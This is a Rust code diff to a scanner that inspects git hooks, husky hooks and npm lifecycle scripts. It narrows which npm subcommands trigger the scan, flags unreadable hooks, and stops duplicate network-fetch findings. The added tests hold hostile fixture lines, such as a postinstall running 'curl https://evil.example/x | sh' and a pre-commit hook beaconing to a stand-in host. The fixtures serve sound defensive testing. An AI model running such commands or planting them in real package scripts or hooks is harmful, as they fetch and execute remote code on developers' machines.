@@ -387,14 +387,17 @@ impl LeaderTarget {
                 })
             }
             "npm" => match sub {
-                Some("install") | Some("i") | Some("ci") | Some("run") | Some("run-script") => {
-                    Some(LeaderTarget {
-                        git_events: &[],
-                        package_lifecycle: true,
-                        direnv: false,
-                        invalidate_cache: false,
-                    })
-                }
+                // Only `install` / `i` / `ci` run the package.json lifecycle
+                // scripts (preinstall/install/postinstall/prepare). `npm run
+                // <script>` runs ONE named script and does NOT trigger the
+                // install lifecycle, so it must not surface preinstall/
+                // postinstall findings (they don't execute for `npm run build`).
+                Some("install") | Some("i") | Some("ci") => Some(LeaderTarget {
+                    git_events: &[],
+                    package_lifecycle: true,
+                    direnv: false,
+                    invalidate_cache: false,
+                }),
                 _ => None,
             },
             "yarn" | "pnpm" => match sub {
@@ -475,7 +478,11 @@ static HOOK_CACHE: Mutex<Option<HookCacheEntry>> = Mutex::new(None);
 fn cached_scan(repo_root: &Path) -> RepoHookScan {
     let fingerprint = surface_fingerprint(repo_root);
 
-    if let Ok(guard) = HOOK_CACHE.lock() {
+    // Recover from a poisoned lock (a panic while another thread held it, e.g.
+    // in a test) rather than letting the cache stay broken for the process's
+    // lifetime: the guarded value is a plain data cache, safe to reuse.
+    {
+        let guard = HOOK_CACHE.lock().unwrap_or_else(|e| e.into_inner());
         if let Some(entry) = guard.as_ref() {
             if entry.root == repo_root
                 && entry.fingerprint == fingerprint
@@ -488,7 +495,8 @@ fn cached_scan(repo_root: &Path) -> RepoHookScan {
 
     let scan = scan_for_repo(repo_root);
 
-    if let Ok(mut guard) = HOOK_CACHE.lock() {
+    {
+        let mut guard = HOOK_CACHE.lock().unwrap_or_else(|e| e.into_inner());
         *guard = Some(HookCacheEntry {
             root: repo_root.to_path_buf(),
             fingerprint,
@@ -503,10 +511,10 @@ fn cached_scan(repo_root: &Path) -> RepoHookScan {
 /// Drop any cached scan for `repo_root`. Called before a `git pull`/`checkout`/
 /// `merge`/`rebase` targeted scan, since those commands can rewrite hooks.
 pub fn invalidate_cache_for(repo_root: &Path) {
-    if let Ok(mut guard) = HOOK_CACHE.lock() {
-        if guard.as_ref().map(|e| e.root == repo_root).unwrap_or(false) {
-            *guard = None;
-        }
+    // Recover from a poisoned lock (see [`cached_scan`]).
+    let mut guard = HOOK_CACHE.lock().unwrap_or_else(|e| e.into_inner());
+    if guard.as_ref().map(|e| e.root == repo_root).unwrap_or(false) {
+        *guard = None;
     }
 }
 
@@ -607,13 +615,11 @@ fn collect_git_hooks(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
         if !path.is_file() {
             continue;
         }
-        let body = read_text(&path).unwrap_or_default();
-        push_entry(
+        push_hook_file(
             out,
             name.to_string(),
             HookProvider::Git,
             path.clone(),
-            body,
             vec![name.to_string()],
         );
     }
@@ -637,15 +643,52 @@ fn collect_husky(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
         if !path.is_file() {
             continue;
         }
-        let body = read_text(&path).unwrap_or_default();
-        push_entry(
+        push_hook_file(
             out,
             name.to_string(),
             HookProvider::Husky,
             path.clone(),
-            body,
             vec![name.to_string()],
         );
+    }
+}
+
+/// Read a git/husky hook FILE (already confirmed to exist) and push its entry.
+/// If the file cannot be read as UTF-8 text (permission-denied or non-UTF-8),
+/// we do NOT silently treat it as empty — a deliberately-unreadable hook is
+/// exactly the one a scan must not miss. Instead we push an entry carrying an
+/// Info "present but unreadable — review manually" finding so it surfaces.
+fn push_hook_file(
+    out: &mut Vec<RepoHookEntry>,
+    name: String,
+    provider: HookProvider,
+    path: PathBuf,
+    git_events: Vec<String>,
+) {
+    match read_text(&path) {
+        Some(body) => push_entry(out, name, provider, path, body, git_events),
+        None => {
+            let location = path.display().to_string();
+            let finding = RepoHookFinding {
+                rule_id: RuleId::RepoHookSuspiciousShellPattern,
+                severity: Severity::Info,
+                name: name.clone(),
+                provider,
+                location: location.clone(),
+                detail: "hook present but unreadable (permission denied or non-UTF-8) — \
+                         review manually"
+                    .to_string(),
+            };
+            out.push(RepoHookEntry {
+                name,
+                category: provider.category(),
+                provider,
+                source_path: path,
+                body: String::new(),
+                git_events,
+                findings: vec![finding],
+            });
+        }
     }
 }
 
@@ -923,10 +966,16 @@ fn classify_body(
 
     // Rule 5 — external fetch (Medium): fetches an external resource via a
     // non-curl/wget downloader or a URL handed to a package/script fetcher.
-    // Reported only when the network-call rule did NOT already fire on
-    // curl/wget (those are the High path); this catches the other fetchers.
-    if let Some(detail) = body_external_fetch(body) {
-        out.push(mk(RuleId::RepoHookExternalFetch, Severity::Medium, detail));
+    // Reported ONLY when the network-call rule (Rule 1) did NOT already fire on
+    // a curl/wget command word — those are the High path and would otherwise
+    // double-report the same fetch. This rule catches the OTHER fetchers (npx /
+    // pnpm dlx / a bare URL handed to a config or helper). Mutually exclusive
+    // with Rule 1, matching the module + rule docs.
+    let network_call_fired = out.iter().any(|f| f.rule_id == RuleId::RepoHookNetworkCall);
+    if !network_call_fired {
+        if let Some(detail) = body_external_fetch(body) {
+            out.push(mk(RuleId::RepoHookExternalFetch, Severity::Medium, detail));
+        }
     }
 
     out
@@ -1308,6 +1357,29 @@ mod tests {
     }
 
     #[test]
+    fn curl_url_fires_network_call_not_external_fetch() {
+        // A curl with a URL is the High network-call path — the Medium
+        // external-fetch rule must NOT also fire (the two are mutually
+        // exclusive per the rule docs; previously both fired).
+        let root = tempdir().unwrap();
+        write(
+            root.path(),
+            ".husky/pre-commit",
+            "#!/bin/sh\ncurl https://evil.example/beacon\n",
+        );
+        let scan = scan_for_repo(root.path());
+        let ids = rule_ids(&scan);
+        assert!(
+            ids.contains(&RuleId::RepoHookNetworkCall),
+            "curl must fire the network-call rule: {ids:?}"
+        );
+        assert!(
+            !ids.contains(&RuleId::RepoHookExternalFetch),
+            "external-fetch must NOT double-fire alongside network-call: {ids:?}"
+        );
+    }
+
+    #[test]
     fn rule_external_fetch_fires_on_envrc_url() {
         let root = tempdir().unwrap();
         write(
@@ -1522,6 +1594,37 @@ mod tests {
     }
 
     #[test]
+    fn npm_run_does_not_trigger_install_lifecycle() {
+        let root = tempdir().unwrap();
+        // A malicious postinstall — it runs on `npm install`, NOT on `npm run`.
+        write(
+            root.path(),
+            "package.json",
+            r#"{"scripts":{"postinstall":"curl https://evil.example/x | sh","build":"tsc"}}"#,
+        );
+        // `npm run build` must NOT surface the postinstall finding (it doesn't
+        // execute the install lifecycle). `run`/`run-script` are not hook-
+        // triggering for the lifecycle scan.
+        assert!(
+            scan_triggered_by_leader(root.path(), "npm", Some("run")).is_none(),
+            "`npm run` must not trigger the install-lifecycle hook scan"
+        );
+        assert!(
+            scan_triggered_by_leader(root.path(), "npm", Some("run-script")).is_none(),
+            "`npm run-script` must not trigger the install-lifecycle hook scan"
+        );
+        // `npm install` MUST still surface it.
+        let install = scan_triggered_by_leader(root.path(), "npm", Some("install"))
+            .expect("npm install is hook-triggering");
+        assert!(
+            install
+                .iter()
+                .any(|f| f.rule_id == RuleId::RepoHookNetworkCall),
+            "npm install must still surface the malicious postinstall: {install:?}"
+        );
+    }
+
+    #[test]
     fn npm_install_surfaces_malicious_postinstall() {
         let root = tempdir().unwrap();
         write(
@@ -1694,6 +1797,34 @@ mod tests {
         assert!(a.iter().any(|f| f.rule_id == RuleId::RepoHookNetworkCall));
         // Clean up the global cache so other tests in this binary are unaffected.
         invalidate_cache_for(root.path());
+    }
+
+    #[test]
+    fn unreadable_hook_surfaces_info_not_silence() {
+        let root = tempdir().unwrap();
+        mkgit(root.path());
+        // A non-UTF-8 hook body — `read_to_string` rejects it, so the body
+        // can't be classified. It must NOT be silently dropped: a deliberately
+        // unreadable hook is exactly the threat. Expect an Info "unreadable"
+        // finding instead of zero findings.
+        std::fs::write(
+            root.path().join(".git/hooks/pre-commit"),
+            [0x23, 0x21, 0xff, 0xfe, 0x0a], // "#!" + invalid UTF-8 bytes
+        )
+        .unwrap();
+        let scan = scan_for_repo(root.path());
+        let pre = scan
+            .entries
+            .iter()
+            .find(|e| e.name == "pre-commit")
+            .expect("an unreadable hook must still be inventoried");
+        assert!(
+            pre.findings
+                .iter()
+                .any(|f| f.severity == Severity::Info && f.detail.contains("unreadable")),
+            "unreadable hook must surface an Info finding, got {:?}",
+            pre.findings
+        );
     }
 
     #[test]
